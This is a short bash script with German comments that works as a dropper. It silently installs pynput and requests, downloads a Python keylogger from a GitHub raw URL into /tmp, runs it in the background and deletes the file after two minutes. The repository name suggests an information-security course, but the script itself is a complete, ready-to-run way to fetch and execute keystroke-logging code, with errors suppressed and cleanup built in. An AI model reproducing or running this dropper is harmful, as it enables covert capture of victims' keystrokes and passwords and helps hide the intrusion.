#!/bin/bash
# Auto-Download und Ausführung des Python Keyloggers für Linux/Ubuntu

# URL des Python-Skripts
SCRIPT_URL="https://raw.githubusercontent.com/LucasWindmueller/InfoSicherheit/main/src/logger_linux.py"
TEMP_FILE="/tmp/keylogger_$(date +%s).py"

# Abhängigkeiten installieren (falls nicht vorhanden)
if ! python3 -c "import pynput" 2>/dev/null; then
    pip3 install --user pynput requests 2>/dev/null || pip install --user pynput requests 2>/dev/null
fi

# Python-Skript herunterladen
curl -s -o "$TEMP_FILE" "$SCRIPT_URL" || wget -q -O "$TEMP_FILE" "$SCRIPT_URL"

# Ausführbar machen
chmod +x "$TEMP_FILE"

# Ausführen
python3 "$TEMP_FILE" &

# Aufräumen (optional - auskommentiert, damit Skript läuft)
sleep 120
rm -f "$TEMP_FILE"

